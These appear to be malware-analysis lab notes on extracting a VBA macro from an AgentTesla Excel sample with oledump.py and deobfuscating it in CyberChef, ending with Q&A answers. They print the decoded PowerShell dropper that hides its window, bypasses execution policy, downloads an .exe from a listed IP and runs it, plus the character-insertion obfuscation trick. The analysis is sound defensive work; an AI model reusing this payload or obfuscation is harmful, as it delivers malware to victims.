
#### 🔧 Tool Overview

- **oledump.py**
    
    - Python tool for analyzing **OLE2/Structured Storage** files.
        
    - These are common formats for MS Office docs (Word, Excel, PowerPoint).
        
    - Can list, extract, and decompress **embedded macros** and data streams.
        
    - Very useful for **malware detection** (macros, obfuscation, payload delivery).
        

---

#### 📌 Key Parameters

- **`oledump.py <file>`**
    
    - Lists all streams inside the OLE file.
        
- **`-s <number>`**
    
    - **Selects** a specific data stream by index.
        
    - Example: `oledump.py agenttesla.xlsm -s 4`
        
- **`--vbadecompress`**
    
    - Decompresses obfuscated VBA macros into readable code.
        
    - Example: `oledump.py agenttesla.xlsm -s 4 --vbadecompress`
        

---

#### 📂 Example: agenttesla.xlsm

Running:

`oledump.py agenttesla.xlsm`

Output:

`A: xl/vbaProject.bin  A1:  468 'PROJECT'  A2:   62 'PROJECTwm'  A3: m 169 'VBA/Sheet1'  A4: M 688 'VBA/ThisWorkbook'  A5:    7 'VBA/_VBA_PROJECT'  A6:  209 'VBA/dir'`

- `M` = Macro present.
    
- **Macro of interest:** `A4: VBA/ThisWorkbook`.
    

---

#### 🔎 Decompressing the Macro

`oledump.py agenttesla.xlsm -s 4 --vbadecompress`

Finds obfuscated string in variable `Sqtnew`:

`Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* ... " Sqtnew = Replace(Sqtnew, "*", "") Sqtnew = Replace(Sqtnew, "^", "")`

➡ Obfuscation method: Inserts `*` and `^` randomly.  
➡ Script then **replaces them with nothing**, restoring the real code.

---

#### 🛠️ Deobfuscation with CyberChef

Steps:

1. Copy obfuscated `Sqtnew` string.
    
2. Open CyberChef (local or online).
    
3. Use **Find/Replace** twice:
    
    - Replace `*` with nothing.
        
    - Replace `^` with nothing.
        

➡ Reveals full PowerShell payload.

---

#### 📜 Decoded PowerShell Script

`powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() |   Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; Start-Process $TempFile;`

---

#### ⚙️ Breakdown of Script

- **`powershell -WindowStyle hidden`**
    
    - Hides PowerShell window to avoid alerting the user.
        
- **`-executionpolicy bypass`**
    
    - Ignores PowerShell restrictions, allows any script to run.
        
- **`[IO.Path]::GetTempFileName()`**
    
    - Generates a temporary file path (e.g., `C:\Users\<user>\AppData\Local\Temp\...`).
        
- **`Rename-Item -replace 'tmp$', 'exe'`**
    
    - Changes `.tmp` extension → `.exe`.
        
    - Ensures malware is executable.
        
- **`Invoke-WebRequest -Uri <URL> -OutFile <path>`**
    
    - Downloads file from the internet.
        
    - In this case: `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`.
        
- **`Start-Process $TempFile`**
    
    - Executes downloaded file (launches malware).
        

➡ **Technique:** Classic **macro → PowerShell → payload download & execute**.

---

#### 📝 Q&A Review

- **Tool for analyzing OLE2 files?** → `oledump.py`
    
- **Parameter to select data stream?** → `-s`
    
- **Command to download files in PowerShell?** → `Invoke-WebRequest`
    
- **Downloaded file name?** → `Doc-3737122pdf.exe`
    
- **Storage location?** → `$TempFile`